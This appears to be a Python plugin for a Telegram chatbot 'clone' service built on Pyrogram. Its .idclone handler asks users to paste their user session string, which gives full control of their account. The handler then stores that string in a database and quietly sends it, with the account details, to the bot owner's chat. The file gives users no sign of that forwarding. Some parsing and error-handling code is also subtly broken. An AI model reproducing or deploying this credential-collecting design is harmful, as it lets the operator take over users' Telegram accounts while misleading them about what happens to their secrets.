import logging
import os
import sys
import shutil
import config
import asyncio
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from ChampuChatBot import CLONE_OWNERS
from ChampuChatBot import ChampuChatBot as app, save_clonebot_owner, save_idclonebot_owner
from ChampuChatBot import db as mongodb
from ChampuChatBot import ChampuChatBot as app

IDCLONES = set()
cloneownerdb = mongodb.cloneownerdb
idclonebotdb = mongodb.idclonebotdb


@Client.on_message(filters.command(["idclone", "cloneid"], prefixes=["."]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        string_session = message.text.split("/idclone", 1)[1].strip()
        mi = await message.reply_text("**ᴄʜᴇᴄᴋɪɴɢ ʏᴏᴜʀ sᴛʀɪɴɢ sᴇssɪᴏɴ...**")
        try:
            ai = Client(
                name="ChampuChatBot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(string_session),
                no_updates=False,
                plugins=dict(root="ChampuChatBot.idchatbot"),
            )
            await ai.start()
            user = await ai.get_me()
            clone_id = user.id
            user_id = user.id
            username = user.username or user.first_name
            await save_idclonebot_owner(clone_id, message.from_user.id)
            
            details = {
                "user_id": user.id,
                "username": username,
                "name": user.first_name,
                "session": string_session,
            }

            cloned_bots = idclonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)

            await app.send_message(
                int(OWNER_ID), f"**#New_Clone**\n\n**ᴜsᴇʀ:** @{username}\n\n**ᴅᴇᴛᴀɪʟs:** {details}\n\n**ᴛᴏᴛᴀʟ ᴄʟᴏɴᴇs:** {total_clones}"
            )

            await idclonebotdb.insert_one(details)
            IDCLONES.add(user.id)

            await mi.edit_text(
                f"**sᴇssɪᴏɴ ғᴏʀ @{username} sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʟᴏɴᴇᴅ ✅.**\n"
                f"**ʀᴇᴍᴏᴠᴇ ᴄʟᴏɴᴇ ʙʏ:** /delidclone\n**ᴄʜᴇᴄᴋ ᴀʟʟ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴs ʙʏ:** /idcloned"
            )
        except AccessTokenInvalid:
            await mi.edit_text(f"**ɪɴᴠᴀʟɪᴅ sᴛʀɪɴɢ sᴇssɪᴏɴ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ..:**")
        except Exception as e:
            logging.exception("ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴄʟᴏɴɪɴɢ ᴘʀᴏᴄᴇss.")
            await mi.edit_text(f"**ɪɴᴠᴀʟɪᴅ sᴛʀɪɴɢ sᴇssɪᴏɴ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ..:**\n\n**ᴇʀʀᴏʀ:** `{e}`")
    else:
        await message.reply_text("**ᴘʀᴏᴠɪᴅᴇ ᴀ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀғᴛᴇʀ ᴛʜᴇ .idclone **\n\n**ᴇxᴀᴍᴘʟᴇ:** `.idclone sᴛʀɪɴɢ sᴇssɪᴏɴ ᴘᴀsᴛᴇ ʜᴇʀᴇ`\n\n**ɢᴇᴛ ᴀ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ ғʀᴏᴍ ʜᴇʀᴇ:-** [ᴄʟɪᴄᴋ ʜᴇʀᴇ](https://telegram.tools/session-string-generator#pyrogram,user) ")


@Client.on_message(filters.command(["idcloned", "clonedid"], prefixes=[".", "/"]))
async def list_cloned_sessions(client, message):
    try:
        cloned_bots = idclonebotdb.find()
        cloned_bots_list = await cloned_bots.to_list(length=None)
        if not cloned_bots_list:
            await message.reply_text("**ɴᴏ sᴇssɪᴏɴs ʜᴀᴠᴇ ʙᴇᴇɴ ᴄʟᴏɴᴇᴅ ʏᴇᴛ.**")
            return

        total_clones = len(cloned_bots_list)
        text = f"**ᴛᴏᴛᴀʟ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴs:** {total_clones}\n\n"
        for bot in cloned_bots_list:
            text += f"**ᴜsᴇʀ ɪᴅ:** `{bot['user_id']}`\n"
            text += f"**ɴᴀᴍᴇ:** {bot['name']}\n"
            text += f"**ᴜsᴇʀɴᴀᴍᴇ:** @{bot['username']}\n\n"

        await message.reply_text(text)
    except Exception as e:
        logging.exception(e)
        await message.reply_text("**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ɢᴇᴛᴛɪɴɢ ʟɪsᴛ ᴏғ ᴄʟᴏɴᴇᴅ ɪᴅ-ᴄʜᴀᴛʙᴏᴛs**")


@Client.on_message(
    filters.command(["delidclone", "delcloneid", "deleteidclone", "removeidclone"], prefixes=["."])
)
async def delete_cloned_session(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text("**⚠️ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀғᴛᴇʀ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ.**\n\n**ᴇxᴀᴍᴘʟᴇ:** `.delidclone ʏᴏᴜʀ sᴛʀɪɴɢ sᴇssɪᴏɴ ʜᴇʀᴇ`")
            return

        string_session = " ".join(message.command[1:])
        ok = await message.reply_text("**ᴄʜᴇᴄᴋɪɴɢ ᴛʜᴇ sᴇssɪᴏɴ sᴛʀɪɴɢ...**")

        cloned_session = await idclonebotdb.find_one({"session": string_session})
        if cloned_session:
            await idclonebotdb.delete_one({"session": string_session})
            

            await ok.edit_text(
                f"**ʏᴏᴜʀ sᴛʀɪɴɢ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴍʏ ᴅᴀᴛᴀʙᴀsᴇ ✅.**\n\n**ʏᴏᴜʀ ʙᴏᴛ ᴡɪʟʟ ᴏғғ ᴀғᴛᴇʀ ʀᴇsᴛᴀʀᴛ @{app.username}**"
            )
        else:
            await message.reply_text("**⚠️ ᴛʜᴇ ᴘʀᴏᴠɪᴅᴇᴅ sᴇssɪᴏɴ ɪs ɴᴏᴛ ɪɴ ᴛʜᴇ ᴄʟᴏɴᴇᴅ ʟɪsᴛ.**")
    except Exception as e:
        await message.reply_text(f"**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ᴅᴇʟᴇᴛɪɴɢ ᴛʜᴇ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴ:** {e}")
        logging.exception(e)


@Client.on_message(filters.command("delallidclone", prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
async def delete_all_cloned_sessions(client, message):
    try:
        a = await message.reply_text("**ᴅᴇʟᴇᴛɪɴɢ ᴀʟʟ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴs...**")
        await idclonebotdb.delete_many({})
        IDCLONES.clear()
        await a.edit_text("**ᴀʟʟ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴs ʜᴀᴠᴇ ʙᴇᴇɴ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅**")
    except Exception as e:
        await a.edit_text(f"**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ᴅᴇʟᴇᴛɪɴɢ ᴀʟʟ ᴄʟᴏɴᴇᴅ sᴇssɪᴏɴs:** {e}")
        logging.exception(e)


